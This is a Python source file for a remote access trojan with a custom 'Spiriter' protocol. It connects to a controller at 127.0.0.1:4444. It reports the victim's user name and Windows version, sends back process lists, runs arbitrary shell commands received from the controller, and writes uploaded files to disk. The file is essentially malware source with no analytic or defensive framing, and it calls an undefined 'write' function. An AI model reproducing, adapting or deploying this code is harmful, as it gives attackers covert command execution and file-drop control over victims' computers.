from datetime import time
from socket import *
from struct import *

import time,os,sys
import platform



SpiriterHeader = b"Spiriter"
SpiriterCommmand=b"\x00"*4





class RecvData:
    ContralCode = None
    Length=None
    ToalLength=None
    SendCount=None
    ToalCount=None
    Data=None



OneData= SpiriterHeader+b"1.00"+(b"\x00"*1024)



SPIRITER_RECV_INIT      =0x0
SPIRITER_RECV_PROCESS   =0x1
SPIRITER_RECV_EXEC_CMD  =0x2
SPIRITER_RECV_UPLOAD    =0x3
class RAT:
    Socket=socket()
    SleepTime=5
    def __init__(self):
        self.Socket.connect(("127.0.0.1",4444))
        self.Socket.send(OneData)
        while True:
            time.sleep(self.SleepTime)
            Ret = self.Recv()
            write("ContralCode:%d"%Ret.ContralCode)
            if Ret.ContralCode==SPIRITER_RECV_INIT:
                Text= ""
                whoami=os.popen("whoami").read()
                OS = platform.version()
                Text= "Whoami:%s       System:Windows %s  "%(whoami,OS)
                self.Send(SPIRITER_RECV_INIT,bytes(Text,encoding="utf8"))
            elif Ret.ContralCode==SPIRITER_RECV_PROCESS:
                self.PS()
            elif Ret.ContralCode==SPIRITER_RECV_EXEC_CMD:
                self.Command(Ret.Data)
            elif Ret.ContralCode==SPIRITER_RECV_UPLOAD:
                self.Upload(Ret)
                


    def Command(self,DOS_Command):
        Com=os.popen(str(DOS_Command,encoding="utf8")).read()
        self.Send(SPIRITER_RECV_PROCESS,bytes(Com,encoding="utf8"))

    def Upload(self,Ret):
        Filename=b""
        Filename=Ret.Data[0:260]
        Filename=Filename.replace(b"\x00",b"")
        FileLength=int(unpack("i",Ret.Data[260:264])[0])
        Data=Ret.Data[264:264+FileLength]
        if(FileLength==len(Data)):
            open(Filename,"wb+").write(Data)
            self.Send(0x0,b"\x00"*4096)
        else:
            write("Data:%d,DataShowLength:%d"%(len(Data),FileLength))
            self.Send(0x3,b"Error")


    def PS(self):
        tasklist=os.popen("tasklist").read()
        
        self.Send(SPIRITER_RECV_PROCESS,bytes(tasklist,encoding="utf8"))
        
    def Send(self,ContralCode,Data):
        write("Length:%d"%len(Data))
        if len(Data)==0:
            Data=b"\x00"*4096
        ncount=0
        Length = len(Data)
        ncount = Length / 4096
        if (Length % 4096) > 0:
            ncount += 1

        SpiriterToalLength=pack("i",Length)
        
        SpiriterCountToal=pack("i",int(ncount))
        d=0
        for i in range(int(ncount)):
            d=d+1
            #write(i)
            if i < ncount-1:
                #totalDataCount = pack("<H",4096)
                make_data = Data[i*4096:(i+1)*4096]
            else:
                #totalDataCount = pack("<H",Length - 4096*i)
                make_data = Data[i*4096:]
            SpiriterLength=pack("i",len(make_data))
            SpiriterData=make_data
            SpiriterSendCount=pack("i",i+1)
            SendData= SpiriterHeader+pack("i",ContralCode)+SpiriterLength+SpiriterToalLength+SpiriterSendCount+SpiriterCountToal+SpiriterData
            self.Socket.sendall(SendData)

    def Recv(self):
        Data=b""
        TryData=b""
        #write(TryData)
        while True:
            TryData=self.Socket.recv(4096+28)
            if TryData[:8]==b"Spiriter":
                write("=========")
                ContralCode = unpack("i",TryData[8:8+4])[0]
                Length=unpack("i",TryData[12:12+4])[0]
                ToalLength= unpack("i",TryData[16:16+4])[0]
                SendCount=unpack("i",TryData[20:20+4])[0]
                ToalCount=unpack("i",TryData[24:24+4])[0]
                Data=Data+TryData[28:Length+28]
            else:
                continue
            write(ToalCount)
            write(SendCount)
            write(ToalLength)
            write(len(Data))
            if ToalLength ==len(Data) and SendCount == ToalCount:
                Ret = RecvData()
                Ret.ContralCode=ContralCode
                Ret.Length=Length
                Ret.ToalLength=ToalLength
                Ret.Data=Data
                Ret.SendCount=SendCount
                Ret.ToalCount=ToalCount
                return Ret
            elif SendCount > ToalCount:
                #print_error("Error Recv ")
                return b""
            else:
                pass

S=RAT()







